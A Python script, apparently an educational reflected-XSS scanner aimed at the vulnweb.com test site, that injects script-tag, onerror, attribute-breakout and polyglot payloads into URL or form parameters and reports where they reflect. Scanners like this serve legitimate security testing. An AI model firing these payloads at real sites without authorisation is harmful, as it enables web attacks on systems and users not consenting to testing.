#!/usr/bin/env python3
"""
Fixed Advanced Reflected XSS Scanner
Optimized for: http://testphp.vulnweb.com
"""

import argparse
import requests
import random
import string
import html
import re
import time
from dataclasses import dataclass, field
from typing import List, Dict, Optional
from urllib.parse import urlparse, urlunparse, urlencode, parse_qsl, quote_plus
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed

# =========================
# Data Classes
# =========================

@dataclass
class PayloadInstance:
    position: str
    template: str
    marker: str
    payload: str

@dataclass
class ReflectionFinding:
    target_url: str
    method: str
    param: str
    position: str
    marker: str
    payload: str
    status_code: int
    contexts: List[str] = field(default_factory=list)

# =========================
# Payload Generator
# =========================

class PayloadGenerator:
    def __init__(self):
        self.base_token = self._rand_token()

    @staticmethod
    def _rand_token(length: int = 6) -> str:
        return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

    def _new_marker(self) -> str:
        return f"XSS{self._rand_token(4)}"

    def generate(self, position: str) -> List[PayloadInstance]:
        instances = []
        
        if position == "free_text":
            templates = [
                "<script>console.log('{MARK}')</script>",
                "<img src=x onerror=alert('{MARK}')>",
                "<h1>{MARK}</h1>"
            ]
        elif position == "attr_value":
            templates = [
                "'{MARK}", 
                '"{MARK}',
                '"><script>alert("{MARK}")</script>',
                "'><img src=x onerror=alert('{MARK}')>"
            ]
        elif position == "polyglot":
            templates = [
                "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert({MARK})//'>",
                "\";alert('{MARK}');//",
            ]
        else:
            templates = ["{MARK}"]

        for tpl in templates:
            marker = self._new_marker()
            if "{MARK}" in tpl:
                payload = tpl.replace("{MARK}", marker)
            else:
                payload = tpl + marker
            
            instances.append(PayloadInstance(position, tpl, marker, payload))
            
        return instances

# =========================
# XSS Scanner Logic
# =========================

class XSSScanner:
    def __init__(self, base_url, params, method="GET", threads=5, verbose=True):
        self.base_url = base_url
        self.params = params
        self.method = method.upper()
        self.max_workers = threads
        self.verbose = verbose
        self.payload_gen = PayloadGenerator()
        self.findings = []
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (XSSScanner/Educational)"
        })

    def _build_url(self, param, payload):
        """Constructs the URL (for GET requests)."""
        parsed = urlparse(self.base_url)
        query_pairs = parse_qsl(parsed.query, keep_blank_values=True)
        q = dict(query_pairs)
        q[param] = payload
        new_query = urlencode(q, doseq=True, quote_via=quote_plus)
        new_parsed = parsed._replace(query=new_query)
        return urlunparse(new_parsed)

    def detect_context_robust(self, html_content, marker):
        contexts = set()
        
        # Regex Heuristics
        if re.search(f"<script[^>]*>[^<]*{marker}", html_content, re.IGNORECASE):
            contexts.add("inside_script_tag")
        # Fixed Regex syntax for attributes
        if re.search(f"<[^>]+=['\"]?[^>]*{marker}", html_content, re.IGNORECASE):
            contexts.add("inside_attribute")
        if re.search(f">{marker}<", html_content):
            contexts.add("html_text_node")
            
        # BeautifulSoup Parsing
        try:
            soup = BeautifulSoup(html_content, "html.parser")
            if soup.find(string=lambda t: t and marker in t):
                contexts.add("rendered_text")
            for tag in soup.find_all():
                for k, v in tag.attrs.items():
                    if marker in str(v):
                        contexts.add(f"attribute:{k}")
        except Exception:
            contexts.add("broken_html_reflection")

        return list(contexts)

    def _test_param(self, param, payload_obj):
        target_url = self.base_url
        
        try:
            if self.method == "GET":
                target_url = self._build_url(param, payload_obj.payload)
                resp = self.session.get(target_url, timeout=5)
            else:
                # POST Logic: Inject payload into one param, leave others empty or default
                # To simulate a real form submission, we might need dummy data for other fields.
                # Here we just send the one we are testing to see if it reflects.
                data = {param: payload_obj.payload}
                resp = self.session.post(target_url, data=data, timeout=5)

            if payload_obj.marker in resp.text:
                contexts = self.detect_context_robust(resp.text, payload_obj.marker)
                return ReflectionFinding(
                    target_url=target_url,
                    method=self.method,
                    param=param,
                    position=payload_obj.position,
                    marker=payload_obj.marker,
                    payload=payload_obj.payload,
                    status_code=resp.status_code,
                    contexts=contexts
                )
        except requests.RequestException:
            pass
        return None

    def scan(self):
        print(f"[+] Scanning {self.base_url} using {self.method}")
        print(f"[+] Parameters to test: {self.params}")
        
        phases = ["free_text", "attr_value", "polyglot"]
        tasks = []
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            for param in self.params:
                for phase in phases:
                    payloads = self.payload_gen.generate(phase)
                    for p_obj in payloads:
                        tasks.append(executor.submit(self._test_param, param, p_obj))
            
            print(f"[+] Running {len(tasks)} tests...")
            
            for future in as_completed(tasks):
                result = future.result()
                if result:
                    self.findings.append(result)
                    print(f"\n[!] VULNERABILITY FOUND!")
                    print(f"    URL: {result.target_url}")
                    print(f"    Method: {result.method}")
                    print(f"    Param: {result.param}")
                    print(f"    Context: {result.contexts}")
                    print(f"    Payload: {result.payload}")

# =========================
# Main Execution
# =========================

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Fixed Advanced Reflected XSS Scanner")
    
    # Required Arguments
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-p", "--params", required=True, help="Comma separated params (e.g. cat,q)")
    
    # Optional Arguments
    parser.add_argument("-m", "--method", default="GET", choices=["GET", "POST"], help="HTTP Method (GET/POST)")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of threads")
    
    args = parser.parse_args()

    params_list = [p.strip() for p in args.params.split(",")]

    scanner = XSSScanner(
        base_url=args.url, 
        params=params_list, 
        method=args.method, 
        threads=args.threads
    )
    scanner.scan()